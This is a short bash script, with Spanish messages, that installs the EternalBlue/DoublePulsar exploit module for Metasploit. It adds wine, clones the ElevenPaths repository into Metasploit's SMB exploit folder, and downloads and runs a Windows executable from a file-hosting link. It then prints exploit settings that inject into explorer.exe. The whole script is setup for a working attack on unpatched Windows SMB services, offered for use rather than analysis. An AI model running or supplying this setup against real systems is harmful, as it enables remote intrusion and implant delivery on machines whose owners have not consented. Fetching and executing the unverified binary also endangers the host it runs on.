#!/bin/bash

echo ""
echo -e "\e[31m Se instalara el exploit eternalblue_doublepulsar de eleven paths\e[0m"
echo ""

apt-get update -y
apt-get upgrade -y
apt-get install wine -y
apt-get install winetricks -y
dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
cd Eternalblue-Doublepulsar-Metasploit/
cp -r deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb
cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
mkdir -p /root/.wine/drive_c/
wget http://download946.mediafire.com/8ko16qjdw2ug/yd7cose1ha7v8sm/pywin32-212.win32-py2.6.exe
wine pywin32-212.win32-py2.6.exe

echo ""
echo -e "\e[31m*****************************************************************\e[0m"
echo -e "\e[33mVerifique el exploit - ejecute metasploit y verifique el exploit \e[0m"
echo -e "\e[33mRuta: exploit/windows/smb/eternalblue_doublepulsar \e[0m"
echo -e "\e[31m*****************************************************************\e[0m"
echo ""
echo "Haz lo siguiente"
echo "set doublepulsarpath /usr/share/metasploit-framework/modules/exploits/windows/smb/deps"
echo "set eternalbluepath /usr/share/metasploit-framework/modules/exploits/windows/smb/deps"
echo "set processinject explorer.exe"
echo ""
